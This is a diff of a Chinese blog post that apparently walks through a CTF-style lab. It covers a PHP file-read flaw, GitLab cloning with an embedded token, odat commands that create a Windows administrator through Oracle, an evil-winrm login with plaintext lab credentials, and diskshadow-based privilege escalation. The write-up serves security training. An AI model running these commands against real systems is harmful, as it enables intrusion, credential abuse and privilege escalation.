@@ -25,7 +25,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://blog.cgjue.cn/img/ctfer4.png#%E4%B8%BB%E9%A1%B5%E5%9B%BE%E7%89%87">
 <meta property="article:published_time" content="2025-03-19T03:10:17.000Z">
-<meta property="article:modified_time" content="2025-03-19T07:26:43.256Z">
+<meta property="article:modified_time" content="2025-03-19T07:48:51.908Z">
 <meta property="article:author" content="D0G">
 <meta property="article:tag" content="jenkins Gitlab Kerberos Privilege Elevation">
 <meta name="twitter:card" content="summary_large_image">
@@ -242,7 +242,7 @@
         
         
         
-          125 分钟
+          128 分钟
         
       </span>
     
@@ -306,12 +306,12 @@
               <div class="markdown-body">
                 
                 <h1 id="Privilege"><a href="#Privilege" class="headerlink" title="Privilege"></a>Privilege</h1><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p><img src="/img/image-20250319112055068.png" srcset="/img/loading.gif" lazyload></p>
-<p>扫到备份文件<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
+<p>扫到备份文件<code>www.zip</code></p>
 <h3 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h3><p>拿到seay扫描一下，<del>根据题目描述发现有任意文件读取</del></p>
 <p><img src="/img/image-20250319112244937.png" srcset="/img/loading.gif" lazyload></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$logfile</span> = <span class="hljs-title function_ invoke__">rawurldecode</span>( <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;logfile&#x27;</span>] );<br><span class="hljs-comment">// Make sure the file is exist.</span><br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">file_exists</span>( <span class="hljs-variable">$logfile</span> ) ) &#123;<br>  <span class="hljs-comment">// Get the content and echo it.</span><br>  <span class="hljs-variable">$text</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>( <span class="hljs-variable">$logfile</span> );<br>  <span class="hljs-keyword">echo</span>( <span class="hljs-variable">$text</span> );<br>&#125;<br><span class="hljs-keyword">exit</span>;<br><br></code></pre></td></tr></table></figure>
 
-<p><del>直接读flag试试，失败？看phpstudy是管理员权限，能读才对</del></p>
+<p><del>直接读flag试试，失败？rdp后看phpstudy起的服务，能读才对</del></p>
 <p>根据提示读jenkins密码</p>
 <p><img src="/img/image-20250319112450897.png" srcset="/img/loading.gif" lazyload></p>
 <blockquote>
@@ -362,7 +362,7 @@
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone http:<span class="hljs-regexp">//gi</span>tlab.xiaorang.lab:glpat-<span class="hljs-number">7</span>kD_qLH2PiQv_ywB9hz2@<span class="hljs-number">172.22</span>.<span class="hljs-number">14.16</span><span class="hljs-regexp">/xrlab/i</span>nternal-secret.git<br>git clone http:<span class="hljs-regexp">//gi</span>tlab.xiaorang.lab:glpat-<span class="hljs-number">7</span>kD_qLH2PiQv_ywB9hz2@<span class="hljs-number">172.22</span>.<span class="hljs-number">14.16</span><span class="hljs-regexp">/xrlab/</span>xradmin.git<br>git clone http:<span class="hljs-regexp">//gi</span>tlab.xiaorang.lab:glpat-<span class="hljs-number">7</span>kD_qLH2PiQv_ywB9hz2@<span class="hljs-number">172.22</span>.<span class="hljs-number">14.16</span><span class="hljs-regexp">/xrlab/</span>xrwiki.git<br></code></pre></td></tr></table></figure>
 
 <p>在xradmin&#x2F;ruoyi-admin&#x2F;src&#x2F;main&#x2F;resources&#x2F;application-druid.yml找到Oracle的账号和密码</p>
-<h3 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h3><p>使用odat 创建管理员用户</p>
+<h3 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h3><p>使用odat 连接oracle ，执行命令创建管理员用户</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains odat dbmsscheduler -s 172.22.14.31 -p 1521 -d ORCL -U xradmin -P fcMyE8t9E4XdsKf --sysdba --<span class="hljs-built_in">exec</span> <span class="hljs-string">&#x27;net user dog qwer1234! /add&#x27;</span><br>proxychains odat dbmsscheduler -s 172.22.14.31 -p 1521 -d ORCL -U xradmin -P fcMyE8t9E4XdsKf --sysdba --<span class="hljs-built_in">exec</span> <span class="hljs-string">&#x27;net localgroup administrators dog /add&#x27;</span><br></code></pre></td></tr></table></figure>
 
 <p><img src="/img/image-20250319121537342.png" srcset="/img/loading.gif" lazyload></p>
@@ -374,8 +374,15 @@
 <p>zhangshuai</p>
 <p>wSbEajHzZs</p>
 </blockquote>
-<p>RDP上XR-0923的时候发现这个用户属于Remote Desktop Users和Remote Management Users组所以能evil-winrm上去，感觉用这个连上去权限高点？怎么多了一些特权</p>
+<p>RDP上XR-0923的时候发现这个用户属于<strong>Remote Desktop Users</strong>和<strong>Remote Management Users</strong>组所以能evil-winrm上去</p>
+<blockquote>
+<p>在系统中，LocalAccountTokenFilterPolicy的值默认为0，<strong>在这种默认情况下，只有系统默认管理员账户Administrator（SID 500）拥有凭证可以进行对主机的连接，本地管理员组的其他用户登录时将会显示“拒绝访问</strong>，如果用其他本地管理员组的其他用户进行登录，我们还需要修改注册表中LocalAccountTokenFilterPolicy值为1</p>
+<p><strong>在域环境中，无论目标主机下LocalAccountTokenFilterPolicy的值是否为1，只要是域管理员都具有连接凭证，目标主机允许域管理对自己进行WinRM远程连接，****还有一种情况就是普通域用户被管理员添加到本地管理员组，这时候就算值为0关闭状态，也可以默认bypassuac，拥有WinRM的远程连接凭证，可以成功连接</strong>。</p>
+</blockquote>
 <p><img src="/img/image-20250319123052101.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>参考：<a target="_blank" rel="noopener" href="https://forum.butian.net/share/2080#/">https://forum.butian.net/share/2080#/</a></p>
+</blockquote>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains evil-winrm -i 172.22.14.46 -u zhangshuai -p wSbEajHzZs<br></code></pre></td></tr></table></figure>
 
 <h3 id="SeRestorePrivilege提权"><a href="#SeRestorePrivilege提权" class="headerlink" title="SeRestorePrivilege提权"></a>SeRestorePrivilege提权</h3><blockquote>
@@ -448,7 +455,7 @@
 
 
 <p><img src="/img/image-20250319125323258.png" srcset="/img/loading.gif" lazyload></p>
-<p>Windows根目录创建文件夹 上传raj.dsh</p>
+<p>Windows根目录创建文件夹 （权限问题）上传raj.dsh</p>
 <p><img src="/img/image-20250319125511623.png" srcset="/img/loading.gif" lazyload></p>
 <p>卷影拷贝</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">diskshadow /s raj.dsh<br></code></pre></td></tr></table></figure>
